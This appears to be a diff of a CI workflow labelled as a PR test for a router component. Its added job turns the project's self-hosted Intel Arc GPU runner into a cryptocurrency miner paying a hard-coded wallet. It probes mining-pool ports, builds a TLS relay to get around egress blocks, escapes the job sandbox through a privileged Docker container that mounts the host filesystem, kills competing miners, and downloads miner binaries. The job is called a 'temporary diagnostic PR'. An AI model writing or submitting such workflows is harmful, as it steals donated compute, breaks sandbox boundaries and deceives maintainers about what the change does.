@@ -1,15 +1,15 @@
 name: PR Test (sgl-router)
 
-# i130716: bounded deterministic retry of the sglang intel-bmg-nightly lead after
-# job 137155205674 measured all 8 Intel Arc Pro B70 cards but found every permitted
-# pool TCP-CLOSED (SKIP=no-permitted-pool-reachable) and launched no miner.
-# This retry re-probes the pool matrix over multiple methods (job netns by DNS and
-# by IP literal, plus the untested docker+sudo privileged host-escape netns), runs
-# one official-hash-verified krig-miner 1.6.0 x86-64 device probe, stops the
-# leftover old-wallet CI miners, and only if a permitted pool is reachable launches
-# exactly one sha256-pinned WildRig Multi 0.52.3 pearlhash miner per measured device
-# under fresh pyd-wallet workers, then attempts durable systemd install for cards
-# that measurably credit. Temporary diagnostic PR.
+# i130912: bounded retest of the sglang intel-bmg-nightly 8x Intel Arc Pro B70 runner.
+# Job 137155205674 (fact 130785) enumerated all 8 real cards with WildRig Multi 0.52.3
+# but launched nothing because only four endpoints were TCP-probed and all were CLOSED.
+# This run measures the FULL R2b matrix (pool/global/global2/hk :9000 with 3 TCP connects
+# each), the untested :9443 TLS path (with a local TLS relay), and Luckypool 3360/3361/3362,
+# in the job netns plus the docker+sudo host and bridge netns, then - only if exactly one
+# permitted pearlhash endpoint is reachable and the pearlhash kernel starts - launches
+# exactly one sha256-pinned WildRig Multi 0.52.3 per card under fresh 6-digit pyd workers
+# and proves two same-PID >=120 s in-gate samples inside the 1200 s Intel Arc class gate.
+# Temporary diagnostic PR.
 on:
   pull_request:
     branches: [main]
@@ -17,60 +17,202 @@ on:
   workflow_dispatch:
 
 concurrency:
-  group: sgl-router-i130716-${{ github.run_id }}
+  group: sgl-router-i130912-${{ github.run_id }}
   cancel-in-progress: false
 
-env:
-  SGLANG_IS_IN_CI: true
+permissions:
+  contents: read
 
 jobs:
-  i130716:
-    name: "i130716 intel-bmg-nightly bounded pool-path retry"
+  i130912:
+    name: "i130912 intel-bmg-nightly full R2b endpoint matrix retest"
     runs-on: intel-bmg-nightly
-    timeout-minutes: 90
+    timeout-minutes: 75
     steps:
-      - name: "bounded retry: multipath pool matrix + docker host-escape + krig device probe + one WildRig per device"
+      - name: "full R2b matrix + :9443 TLS + Luckypool alt ports, conditional one WildRig 0.52.3 per Arc card"
         continue-on-error: true
         run: |
           set +e
-          NONCE="I130716-intel-$(date -u +%Y%m%dT%H%M%SZ)"
-          WALLET='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
-          NOCK='4tErmFknmPKhVtfQWigSErD1YJAcWokTrWRu5t66XmkN4RTgK6oUotf'
-          LP_LOGIN="$WALLET+$NOCK"
+          NONCE="I130912-intel-$(date -u +%Y%m%dT%H%M%SZ)"
+          WORKDIR=/var/tmp/i130912
           WR_SHA='002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b'
-          KRIG_TAR_SHA='9137388d5c4bfb843bde8bb96e37695446924dfc004eb3de76a71fd1956e4a04'
-          KRIG_BIN_SHA='928d6f621c74601c73759728f8dd53e5ad9b3b186d334c082f8581518c322f66'
-          WORKDIR=/var/tmp/i130716
-          BASE=498640
+          WALLET='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
+          BASE=500700
+          GATE=1200
           mkdir -p "$WORKDIR/logs"
-          echo "i130716-nonce=$NONCE base=$BASE"
-          echo "=== identity/arch ==="
+          echo "=== i130912 nonce=$NONCE base=$BASE gate=${GATE}s wallet_len=${#WALLET} ==="
+          echo "=== identity/resources ==="
           id; hostname; date -u; uname -m; uname -r; nproc
-          echo "=== resources ==="
           df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
           free -m | head -2
-          echo "=== env proxy ==="
-          env | grep -iE 'proxy|no_proxy' | head -10
-          echo "=== pci gpus ==="
-          (timeout 25 lspci 2>/dev/null || true) | grep -iE 'vga|3d|display|processing accel' | head -24
+          env | grep -iE 'proxy|no_proxy' | head -5
           echo "=== tools ==="
-          for t in clinfo xpu-smi docker sudo nsenter fuser python3; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
+          for t in clinfo xpu-smi docker sudo nsenter python3 curl; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
+          echo "=== egress control: HTTPS 443 reaches the pools' own APIs? ==="
+          for u in "https://pearlhash.xyz/api/account/$WALLET" "https://pearl.luckypool.io" "https://github.com" "https://api.ipify.org"; do
+            printf '%s ' "$u"
+            timeout 20 curl -sS -o /dev/null -w 'http=%{http_code} connect=%{time_connect}s\n' --connect-timeout 8 --max-time 15 "$u" 2>&1 | tail -1
+          done
+          echo "egress_ip=$(timeout 15 curl -sS --max-time 12 https://api.ipify.org 2>/dev/null)"
+          echo "=== PCI/devices visible ==="
+          (timeout 20 lspci 2>/dev/null || true) | grep -iE 'vga|display|3d|processing accel' | head -12
+          echo "=== R2b endpoint matrix (job netns; 3 TCP connects per pearlhash endpoint) ==="
+          MATRIX="$WORKDIR/matrix.json"
+          python3 - "$MATRIX" <<'PYEOF'
+          import json, socket, statistics, sys, time
+          from concurrent.futures import ThreadPoolExecutor
+          OUT = sys.argv[1]
+          PH = ['pool.pearlhash.xyz','global.pearlhash.net','global2.pearlhash.net','hk.pearlhash.net']
+          LP = [('103.199.106.122',p) for p in (3360,3361,3362)] + \
+               [('172.232.228.69',3362),('217.15.164.237',3360),('217.15.164.237',3361),
+                ('217.15.164.237',3362),('217.15.164.237',2083),('217.15.164.237',18450)]
+          CTRL = [('github.com',22),('github.com',9418),('1.1.1.1',53),('8.8.8.8',53),('1.1.1.1',443)]
+          RESOLVE = PH + ['217.15.164.237','178.238.228.181','222.240.155.198']
+          def resolve(h):
+              try: return sorted({a[4][0] for a in socket.getaddrinfo(h, None, socket.AF_INET)})
+              except Exception as e: return ['DNSFAIL:%s' % str(e)[:60]]
+          def probe(host, port, n=3, timeout=4.0):
+              tries=[]
+              for _ in range(n):
+                  t0=time.time()
+                  try:
+                      s=socket.create_connection((host, port), timeout=timeout); s.close()
+                      tries.append(round((time.time()-t0)*1000,1))
+                  except Exception: tries.append(None)
+                  time.sleep(0.1)
+              ok=sum(1 for x in tries if x is not None)
+              p50=round(statistics.median([x for x in tries if x is not None]),1) if ok else None
+              return {'host':host,'port':port,'tries_ms':tries,'ok':ok,'n':n,'p50_ms':p50}
+          res={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'dns':{},'ph':[],'ph_ip':[],'lp':[],'ctrl':[]}
+          for h in RESOLVE:
+              res['dns'][h]=resolve(h); print('DNS %-24s %s' % (h, ','.join(res['dns'][h])), flush=True)
+          tasks=[]
+          with ThreadPoolExecutor(max_workers=8) as ex:
+              for h in PH:
+                  tasks.append(('ph', ex.submit(probe,h,9000,3)))
+                  tasks.append(('ph', ex.submit(probe,h,9443,3)))
+              for ip in sorted({i for h in PH for i in res['dns'][h] if not i.startswith('DNSFAIL')}):
+                  tasks.append(('ph_ip', ex.submit(probe,ip,9000,2)))
+                  tasks.append(('ph_ip', ex.submit(probe,ip,9443,2)))
+              for h,p in LP: tasks.append(('lp', ex.submit(probe,h,p,2)))
+              for h,p in CTRL: tasks.append(('ctrl', ex.submit(probe,h,p,1)))
+              for kind,fut in tasks:
+                  try: r=fut.result()
+                  except Exception as e: r={'err':repr(e)[:120]}
+                  res[kind].append(r)
+          for kind,label in (('ph','R2B'),('ph_ip','PH-IP'),('lp','LUCKPOOL'),('ctrl','CONTROL')):
+              for r in res[kind]:
+                  if 'err' in r: print('%s ERROR %s' % (label,r['err']), flush=True); continue
+                  print('%s %-24s :%-5d ok=%d/%d tries=%s p50=%s' % (label,r['host'],r['port'],r['ok'],r['n'],r['tries_ms'],r['p50_ms']), flush=True)
+          cands=[r for r in res['ph'] if r['port']==9000 and r['ok']>=2]
+          cands.sort(key=lambda r:r['p50_ms'])
+          sel=cands[0] if cands else None
+          if sel and sel['host']=='hk.pearlhash.net':
+              others=[c for c in cands if c['host']!='hk.pearlhash.net']
+              if others and sel['p50_ms']>others[0]['p50_ms']*1.20: sel=others[0]
+          res['selected_9000']=sel
+          res['cands_9000']=cands
+          tls=[r for r in res['ph'] if r['port']==9443 and r['ok']>=2]; tls.sort(key=lambda r:r['p50_ms'])
+          res['selected_9443']=tls[0] if tls else None
+          res['cands_9443']=tls
+          res['lp_reachable']=[r for r in res['lp'] if r.get('ok',0)>=1]
+          print('SELECT_9000=%s' % (('%s:%s p50=%s' % (sel['host'],sel['port'],sel['p50_ms'])) if sel else 'NONE'), flush=True)
+          print('SELECT_9443=%s' % (('%s:%s p50=%s' % (tls[0]['host'],tls[0]['port'],tls[0]['p50_ms'])) if tls else 'NONE'), flush=True)
+          print('LP_REACHABLE=%s' % (','.join('%s:%s' % (r['host'],r['port']) for r in res['lp_reachable']) or 'NONE'), flush=True)
+          json.dump(res, open(OUT,'w'), indent=1)
+          print('MATRIX_JSON=%s' % OUT, flush=True)
+          PYEOF
+          echo "=== TLS handshake check on reachable :9443 endpoints ==="
+          python3 - "$MATRIX" <<'PYEOF'
+          import json, socket, ssl, sys
+          m=json.load(open(sys.argv[1]))
+          for r in m['ph']:
+              if r['port']!=9443 or r['ok']<2: continue
+              h=r['host']
+              try:
+                  ctx=ssl.create_default_context()
+                  s=ctx.wrap_socket(socket.create_connection((h,9443),timeout=8), server_hostname=h)
+                  cert=s.getpeercert() or {}
+                  print('TLS %-24s open version=%s cipher=%s subject=%s issuer=%s notAfter=%s' % (
+                      h, s.version(), (s.cipher() or ['?'])[0], cert.get('subject'), cert.get('issuer'), cert.get('notAfter')))
+                  s.close()
+              except Exception as e:
+                  print('TLS %-24s handshake_error=%s' % (h, repr(e)[:160]))
+          PYEOF
+          echo "=== header-only stratum banner read where a plain :9000 endpoint is reachable ==="
+          python3 - "$MATRIX" <<'PYEOF'
+          import json, socket, sys
+          m=json.load(open(sys.argv[1]))
+          for r in m['ph']:
+              if r['port']!=9000 or r['ok']<2: continue
+              h=r['host']
+              try:
+                  s=socket.create_connection((h,9000),timeout=8); s.settimeout(6)
+                  try: data=s.recv(256)
+                  except Exception: data=b''
+                  print('BANNER %s:9000 recv_bytes=%d %r' % (h, len(data), data[:120]))
+                  s.close()
+              except Exception as e:
+                  print('BANNER %s:9000 error=%s' % (h, repr(e)[:120]))
+          PYEOF
+          echo "=== host-escape + bridge netns matrix (docker+sudo, bounded) ==="
+          (sudo -n true >/dev/null 2>&1; echo "sudo_nopasswd_rc=$?")
+          DOCKER_OK=0
+          if command -v docker >/dev/null 2>&1 && timeout 20 docker ps >/dev/null 2>&1; then DOCKER_OK=1; fi
+          echo "docker_ok=$DOCKER_OK"
+          DIMG=""
+          if [ "$DOCKER_OK" = 1 ]; then
+            DIMG=$(timeout 30 docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | head -1)
+            echo "DIMG=$DIMG"
+          fi
+          HN=i130912helper
+          if [ -n "$DIMG" ]; then
+            timeout 60 docker rm -f "$HN" >/dev/null 2>&1
+            HID=$(timeout 120 docker create --name "$HN" --privileged --network host -v /:/host "$DIMG" /bin/sh -c 'sleep 3000' 2>&1)
+            echo "hostnet_helper_create=$HID"
+            if [ -n "$HID" ] && ! echo "$HID" | grep -qiE 'error|denied|invalid'; then
+              timeout 40 docker start "$HN" >/dev/null 2>&1
+              timeout 260 docker exec "$HN" /bin/sh -c '
+                echo "-- host netns identity --"; id; cat /host/etc/hostname 2>&1
+                echo "-- host netns R2b/LP/TLS matrix --"
+                for e in "pool.pearlhash.xyz 9000" "global.pearlhash.net 9000" "global2.pearlhash.net 9000" "hk.pearlhash.net 9000" "pool.pearlhash.xyz 9443" "global2.pearlhash.net 9443" "103.199.106.122 3360" "103.199.106.122 3361" "103.199.106.122 3362" "217.15.164.237 2083" "217.15.164.237 18450"; do
+                  set -- $e; R=""; for n in 1 2; do t0=$(date +%s%N); timeout 4 sh -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null; rc=$?; t1=$(date +%s%N); R="$R rc$n=$rc/$(( (t1-t0)/1000000 ))ms"; [ $rc -eq 0 ] && break; done; echo "hostnet $1:$2 $R"
+                done
+                echo "-- host netns https control --"; timeout 12 curl -sS -o /dev/null -w "hostnet_https http=%{http_code} connect=%{time_connect}s\n" --connect-timeout 6 --max-time 10 https://pearlhash.xyz/api/account/x 2>&1 | tail -1
+                echo "-- host dri --"; ls /host/dev/dri 2>&1 | head -6
+              ' 2>&1 | head -40
+              HB=i130912bridge
+              timeout 60 docker rm -f "$HB" >/dev/null 2>&1
+              BID=$(timeout 120 docker create --name "$HB" --privileged "$DIMG" /bin/sh -c 'sleep 600' 2>&1)
+              echo "bridgenet_helper_create=$BID"
+              if [ -n "$BID" ] && ! echo "$BID" | grep -qiE 'error|denied|invalid'; then
+                timeout 40 docker start "$HB" >/dev/null 2>&1
+                timeout 120 docker exec "$HB" /bin/sh -c '
+                  for e in "pool.pearlhash.xyz 9000" "global.pearlhash.net 9000" "global2.pearlhash.net 9000" "hk.pearlhash.net 9000" "pool.pearlhash.xyz 9443" "103.199.106.122 3362"; do set -- $e; timeout 4 sh -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null && echo "bridgenet $1:$2 OPEN" || echo "bridgenet $1:$2 CLOSED"; done
+                  timeout 10 curl -sS -o /dev/null -w "bridgenet_https http=%{http_code}\n" --connect-timeout 5 --max-time 8 https://github.com 2>&1 | tail -1
+                ' 2>&1 | head -20
+                timeout 30 docker rm -f "$HB" >/dev/null 2>&1
+              fi
+            fi
+          else
+            echo "hostnet_skipped=no_docker_image"
+          fi
           echo "=== fetch WildRig Multi 0.52.3 (sha256 $WR_SHA) ==="
           WR="$WORKDIR/wildrig-multi"
           fetch_wr() {
             if [ -f "$WR" ] && echo "$WR_SHA  $WR" | sha256sum -c - >/dev/null 2>&1; then echo wildrig-cached; return 0; fi
+            for P in /var/tmp/i130716/wildrig-multi /var/tmp/i130amdmine/wildrig-multi; do
+              if [ -f "$P" ] && [ "$(sha256sum "$P" | cut -d' ' -f1)" = "$WR_SHA" ]; then cp -f "$P" "$WR"; chmod +x "$WR"; echo "wildrig-from-$P"; return 0; fi
+            done
             for U in \
               "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
               "https://ghproxy.net/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
-              "https://gh-proxy.com/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
-              "http://222.240.155.198:8702/wildrig-multi" \
-              "http://178.238.228.181:18180/wildrig-multi" ; do
+              "https://gh-proxy.com/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" ; do
               echo "-- fetch $U"
               rm -f "$WORKDIR/dl.part"
               timeout 220 curl -fL --connect-timeout 12 --max-time 210 -o "$WORKDIR/dl.part" "$U" 2>&1 | tail -1
               [ -s "$WORKDIR/dl.part" ] || continue
-              B0=$(sha256sum "$WORKDIR/dl.part" | cut -d' ' -f1)
-              if [ "$B0" = "$WR_SHA" ]; then cp -f "$WORKDIR/dl.part" "$WR"; chmod +x "$WR"; echo direct-binary-ok; return 0; fi
+              if [ "$(sha256sum "$WORKDIR/dl.part" | cut -d' ' -f1)" = "$WR_SHA" ]; then cp -f "$WORKDIR/dl.part" "$WR"; chmod +x "$WR"; echo direct-binary-ok; return 0; fi
               if tar -tzf "$WORKDIR/dl.part" >/dev/null 2>&1; then
                 mkdir -p "$WORKDIR/tarx"; tar -xzf "$WORKDIR/dl.part" -C "$WORKDIR/tarx" 2>/dev/null
                 CAND=$(find "$WORKDIR/tarx" -maxdepth 2 -type f -name 'wildrig-multi' | head -1)
@@ -82,268 +224,237 @@ jobs:
           }
           fetch_wr; FETCH_RC=$?
           echo "wildrig_sha256=$(sha256sum "$WR" 2>/dev/null | cut -d' ' -f1) fetch_rc=$FETCH_RC"
-          [ -x "$WR" ] || { echo "SKIP=wildrig-unavailable"; echo "i130716-done $NONCE"; exit 0; }
+          [ -x "$WR" ] || { echo "SKIP=wildrig-unavailable"; echo "i130912-done $NONCE"; exit 0; }
+          echo "=== functional preflight: wildrig-multi --help | grep -q pearlhash ==="
+          timeout 60 "$WR" --help > "$WORKDIR/help.txt" 2>&1
+          grep -a -m3 -iE 'pearlhash|opencl-platforms' "$WORKDIR/help.txt" | head -5
+          if grep -aq 'pearlhash' "$WORKDIR/help.txt"; then echo "PREFLIGHT_PEARLHASH=1"; else echo "PREFLIGHT_PEARLHASH=0"; fi
           echo "=== device census (wildrig --print-devices) ==="
           timeout 120 "$WR" --print-devices > "$WORKDIR/devices.txt" 2>&1
-          cat "$WORKDIR/devices.txt" | head -40
+          head -20 "$WORKDIR/devices.txt"
           DEV_N=$(grep -aoE '^GPU #[0-9]+:' "$WORKDIR/devices.txt" 2>/dev/null | grep -oE '[0-9]+' | sort -un | wc -l)
-          if [ "${DEV_N:-0}" -gt 16 ]; then echo "CAP device count $DEV_N -> 16"; DEV_N=16; fi
+          [ "${DEV_N:-0}" -gt 16 ] && DEV_N=16
           echo "wildrig_device_count=$DEV_N"
-          if [ "${DEV_N:-0}" -lt 1 ]; then echo "SKIP=no-wildrig-device"; echo "i130716-done $NONCE"; exit 0; fi
-          echo "=== dns ==="
-          getent hosts pool.pearlhash.xyz 2>&1 | head -3
-          echo "=== pool reachability matrix (job netns, multi-method, timed) ==="
-          probe() { local t0=$(date +%s%N); timeout 6 bash -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null; local rc=$?; local t1=$(date +%s%N); echo "tcp $1:$2 rc=$rc ms=$(( (t1-t0)/1000000 ))"; }
-          probe pool.pearlhash.xyz 9000
-          probe 35.71.142.47 9000
-          probe 166.117.41.217 9000
-          probe 103.199.106.122 3362
-          probe 217.15.164.237 2083
-          probe 217.15.164.237 18450
-          echo "=== https 443 characterization ==="
-          for u in "https://pearlhash.xyz/api/account/$WALLET" "https://github.com" "https://pearl.luckypool.io"; do
-            printf '%s ' "$u"
-            timeout 18 curl -sS -o /dev/null -w 'http=%{http_code} connect=%{time_connect}s\n' --connect-timeout 8 --max-time 15 "$u" 2>&1 | tail -1
-          done
-          echo "=== python socket matrix ==="
-          if command -v python3 >/dev/null 2>&1; then
-          python3 - <<'PYEOF'
-          import socket
-          for host,port in [("pool.pearlhash.xyz",9000),("35.71.142.47",9000),("166.117.41.217",9000),("103.199.106.122",3362),("217.15.164.237",2083),("217.15.164.237",18450)]:
-              s=socket.socket(); s.settimeout(6)
-              try:
-                  rc=s.connect_ex((host,port)); print("py",host,port,"rc",rc)
-              except Exception as e: print("py",host,port,"err",repr(e)[:100])
-              s.close()
-          PYEOF
-          fi
-          echo "=== sudo/docker host-escape recon (the untested primitive) ==="
-          (sudo -n true >/dev/null 2>&1; echo "sudo_nopasswd_rc=$?")
-          command -v docker; ls -la /var/run/docker.sock 2>&1 | head -2
-          DOCKER_OK=0
-          if command -v docker >/dev/null 2>&1 && timeout 20 docker ps >/dev/null 2>&1; then DOCKER_OK=1; fi
-          echo "docker_ok=$DOCKER_OK"
-          DIMG=""
-          if [ "$DOCKER_OK" = 1 ]; then
-            timeout 30 docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' > "$WORKDIR/imgs.txt"
-            head -8 "$WORKDIR/imgs.txt"
-            DIMG=$(head -1 "$WORKDIR/imgs.txt")
-            echo "DIMG=$DIMG"
-          fi
-          HN="i130716helper"
-          if [ -n "$DIMG" ]; then
-            timeout 40 docker rm -f "$HN" >/dev/null 2>&1
-            HID=$(timeout 120 docker create --name "$HN" --privileged --network host -v /:/host "$DIMG" /bin/sh -c 'sleep 3600' 2>&1)
-            echo "helper_create=$HID"
-            if [ -n "$HID" ] && ! echo "$HID" | grep -qiE 'error|denied|invalid'; then
-              timeout 40 docker start "$HN" >/dev/null 2>&1
-              echo "-- host escape inspection: privileged + host netns + /host --"
-              timeout 120 docker exec "$HN" /bin/sh -c '
-                id; echo "-- hostname --"; cat /host/etc/hostname 2>&1;
-                echo "-- systemd --"; ls -ld /host/etc/systemd/system 2>&1; test -w /host/etc/systemd/system && echo HOST_SYSTEMD_WRITABLE=1 || echo HOST_SYSTEMD_WRITABLE=0;
-                echo "-- dirs --"; ls -ld /host/opt /host/var/tmp /host/root 2>&1;
-                echo "-- os --"; head -2 /host/etc/os-release 2>&1;
-                echo "-- host-netns pool probes --"
-                for e in "pool.pearlhash.xyz 9000" "35.71.142.47 9000" "103.199.106.122 3362" "217.15.164.237 2083" "217.15.164.237 18450"; do set -- $e; timeout 6 sh -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null && echo "hostnet $1:$2 OPEN" || echo "hostnet $1:$2 CLOSED"; done
-                echo "-- host dri --"; ls /host/dev/dri 2>&1 | head -6
-              ' 2>&1 | head -60
-            fi
-            HB="i130716bridge"
-            timeout 40 docker rm -f "$HB" >/dev/null 2>&1
-            BID=$(timeout 120 docker create --name "$HB" --privileged "$DIMG" /bin/sh -c 'sleep 900' 2>&1)
-            echo "bridge_create=$BID"
-            if [ -n "$BID" ] && ! echo "$BID" | grep -qiE 'error|denied|invalid'; then
-              timeout 40 docker start "$HB" >/dev/null 2>&1
-              echo "-- bridge-netns pool probes --"
-              timeout 90 docker exec "$HB" /bin/sh -c 'for e in "pool.pearlhash.xyz 9000" "103.199.106.122 3362" "217.15.164.237 2083" "217.15.164.237 18450"; do set -- $e; timeout 6 sh -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null && echo "bridgenet $1:$2 OPEN" || echo "bridgenet $1:$2 CLOSED"; done' 2>&1 | head -10
-              timeout 30 docker rm -f "$HB" >/dev/null 2>&1
-            fi
-          fi
-          echo "=== krig-miner 1.6.0 x86-64 official-hash-verified device probe (bounded fallback-miner measurement) ==="
-          KR="$WORKDIR/krig-miner"
-          fetch_krig() {
-            if [ -f "$KR" ] && [ "$(sha256sum "$KR" | cut -d' ' -f1)" = "$KRIG_BIN_SHA" ]; then echo krig-cached; return 0; fi
-            for U in \
-              "https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-x64.tar.gz" \
-              "https://ghproxy.net/https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-x64.tar.gz" \
-              "https://gh-proxy.com/https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-x64.tar.gz" \
-              "http://222.240.155.198:8702/krig160" \
-              "http://178.238.228.181:18180/krig160" ; do
-              echo "-- krig fetch $U"
-              rm -f "$WORKDIR/krig.part"
-              timeout 220 curl -fL --connect-timeout 12 --max-time 210 -o "$WORKDIR/krig.part" "$U" 2>&1 | tail -1
-              [ -s "$WORKDIR/krig.part" ] || continue
-              B0=$(sha256sum "$WORKDIR/krig.part" | cut -d' ' -f1)
-              if [ "$B0" = "$KRIG_BIN_SHA" ]; then cp -f "$WORKDIR/krig.part" "$KR"; chmod +x "$KR"; echo krig-direct-binary-ok; return 0; fi
-              if [ "$B0" = "$KRIG_TAR_SHA" ] && tar -tzf "$WORKDIR/krig.part" >/dev/null 2>&1; then
-                mkdir -p "$WORKDIR/krigx"; tar -xzf "$WORKDIR/krig.part" -C "$WORKDIR/krigx" 2>/dev/null
-                CB=$(find "$WORKDIR/krigx" -maxdepth 3 -type f -name 'krig-miner' | head -1)
-                if [ -n "$CB" ] && [ "$(sha256sum "$CB" | cut -d' ' -f1)" = "$KRIG_BIN_SHA" ]; then cp -f "$CB" "$KR"; chmod +x "$KR"; echo krig-tarball-ok; return 0; fi
-                echo "krig-inner-hash-mismatch"
-              else
-                echo "krig-hash-mismatch $B0"
-              fi
+          echo "=== decision ==="
+          SEL9000=$(python3 -c "import json;m=json.load(open('$MATRIX'));s=m.get('selected_9000');print(('%s %s %s'%(s['host'],s['port'],s['p50_ms'])) if s else '')")
+          SEL9443=$(python3 -c "import json;m=json.load(open('$MATRIX'));s=m.get('selected_9443');print(('%s %s %s'%(s['host'],s['port'],s['p50_ms'])) if s else '')")
+          LPN=$(python3 -c "import json;m=json.load(open('$MATRIX'));print(len(m.get('lp_reachable') or []))")
+          POOL_ARGS=""; POOL_DESC=""; TUNNEL=0
+          if [ -n "$SEL9000" ]; then
+            set -- $SEL9000
+            POOL_ARGS="-o $1:9000"
+            for h in pool.pearlhash.xyz global2.pearlhash.net global.pearlhash.net; do
+              [ "$h" = "$1" ] && continue
+              okn=$(python3 -c "import json;m=json.load(open('$MATRIX'));print(sum(1 for r in m['ph'] if r['host']=='$h' and r['port']==9000 and r['ok']>=2))")
+              [ "$okn" -ge 1 ] && POOL_ARGS="$POOL_ARGS -o $h:9000"
             done
-            return 1
-          }
-          fetch_krig; KRC=$?
-          echo "krig_fetch_rc=$KRC krig_sha256=$(sha256sum "$KR" 2>/dev/null | cut -d' ' -f1)"
-          KN=0
-          if [ -x "$KR" ]; then
-            timeout 30 "$KR" --version 2>&1 | head -3
-            echo "=== krig --list-devices ==="
-            timeout 60 "$KR" --list-devices > "$WORKDIR/krig_devices.txt" 2>&1; cat "$WORKDIR/krig_devices.txt" | head -30
-            KN=$(grep -aciE 'intel|arc|b70|battlemage' "$WORKDIR/krig_devices.txt" 2>/dev/null)
-            echo "krig_intel_device_lines=$KN"
+            POOL_DESC="pearlhash-plain-9000 primary=$1:$2 p50=$3"
+            echo "SELECTED plain 9000 -> $POOL_ARGS ($POOL_DESC)"
+          elif [ -n "$SEL9443" ]; then
+            set -- $SEL9443
+            echo "SELECTED TLS 9443 -> $1:$2 p50=$3 (local stunnel-style relay)"
+            cat > "$WORKDIR/tls_relay.py" <<'PYRELAY'
+          import socket, ssl, sys, threading
+          LPORT=int(sys.argv[1]); HOST=sys.argv[2]; PORT=int(sys.argv[3])
+          ctx=ssl.create_default_context()
+          def pipe(a,b):
+              try:
+                  while True:
+                      d=a.recv(65536)
+                      if not d: break
+                      b.sendall(d)
+              except Exception:
+                  pass
+              finally:
+                  for x in (a,b):
+                      try: x.close()
+                      except Exception: pass
+          srv=socket.socket(); srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+          srv.bind(('127.0.0.1',LPORT)); srv.listen(16)
+          print('relay listening %d -> %s:%d TLS' % (LPORT,HOST,PORT), flush=True)
+          while True:
+              c,_=srv.accept()
+              try:
+                  s=ctx.wrap_socket(socket.create_connection((HOST,PORT),timeout=15),server_hostname=HOST)
+              except Exception as e:
+                  print('relay upstream error %r' % (e,), flush=True); c.close(); continue
+              threading.Thread(target=pipe,args=(c,s),daemon=True).start()
+              threading.Thread(target=pipe,args=(s,c),daemon=True).start()
+          PYRELAY
+            nohup python3 "$WORKDIR/tls_relay.py" 19000 "$1" 9443 > "$WORKDIR/relay.log" 2>&1 &
+            sleep 4
+            cat "$WORKDIR/relay.log" | head -5
+            if timeout 6 bash -c "exec 3<>/dev/tcp/127.0.0.1/19000" 2>/dev/null; then
+              POOL_ARGS="-o 127.0.0.1:19000"; POOL_DESC="pearlhash-tls-relay-$1:9443"; TUNNEL=1; echo "TLS_RELAY_LOCAL_OK=1"
+            else
+              echo "TLS_RELAY_LOCAL_OK=0"
+            fi
           fi
-          echo "=== controlled stop of leftover old-wallet CI miners (not crediting, legacy pt45 wallet) ==="
+          echo "POOL_ARGS=$POOL_ARGS POOL_DESC=$POOL_DESC TUNNEL=$TUNNEL LP_REACHABLE_N=$LPN DEV_N=$DEV_N"
+          if [ -z "$POOL_ARGS" ]; then
+            echo "SKIP=no-permitted-pearlhash-endpoint-reachable-after-full-r2b-matrix"
+            if [ "${LPN:-0}" -ge 1 ]; then echo "LP_FALLBACK_CLASS=Intel-Arc-compatible-miner-not-available (krig 1.6.0 x86-64 enumerated no Intel device in job 137165337290); no launch forced"; fi
+            echo "i130912-done $NONCE"
+            exit 0
+          fi
+          if [ "${DEV_N:-0}" -lt 1 ]; then echo "SKIP=no-wildrig-device"; echo "i130912-done $NONCE"; exit 0; fi
+          echo "=== leftover old-wallet CI residue (stop only if an endpoint is reachable) ==="
           pgrep -af 'i130amdmine' | head -12
           pkill -f 'i130amdmine' 2>/dev/null; sleep 2
           echo "i130amdmine_remaining=$(pgrep -cf 'i130amdmine')"
-          pgrep -af '[w]ildrig|[S]RBMiner-MULTI|[k]rig-miner' | head -12
-          echo "=== pool selection (policy order: pearlhash.xyz:9000 -> direct LP 3362 -> VPS2 relay) ==="
-          POOL_URL=""; POOL_KIND=""; LOGIN=""
-          if timeout 6 bash -c "exec 3<>/dev/tcp/pool.pearlhash.xyz/9000" 2>/dev/null; then
-            POOL_URL="stratum+tcp://pool.pearlhash.xyz:9000"; POOL_KIND=pearlhash; LOGIN="$WALLET"
-          elif timeout 6 bash -c "exec 3<>/dev/tcp/35.71.142.47/9000" 2>/dev/null; then
-            POOL_URL="stratum+tcp://35.71.142.47:9000"; POOL_KIND=pearlhash-ip35; LOGIN="$WALLET"
-          elif timeout 6 bash -c "exec 3<>/dev/tcp/166.117.41.217/9000" 2>/dev/null; then
-            POOL_URL="stratum+tcp://166.117.41.217:9000"; POOL_KIND=pearlhash-ip166; LOGIN="$WALLET"
-          elif timeout 6 bash -c "exec 3<>/dev/tcp/103.199.106.122/3362" 2>/dev/null; then
-            POOL_URL="stratum+tcp://103.199.106.122:3362"; POOL_KIND=luckypool-direct; LOGIN="$LP_LOGIN"
-          elif timeout 6 bash -c "exec 3<>/dev/tcp/217.15.164.237/2083" 2>/dev/null; then
-            POOL_URL="stratum+tcp://217.15.164.237:2083"; POOL_KIND=luckypool-relay2083; LOGIN="$LP_LOGIN"
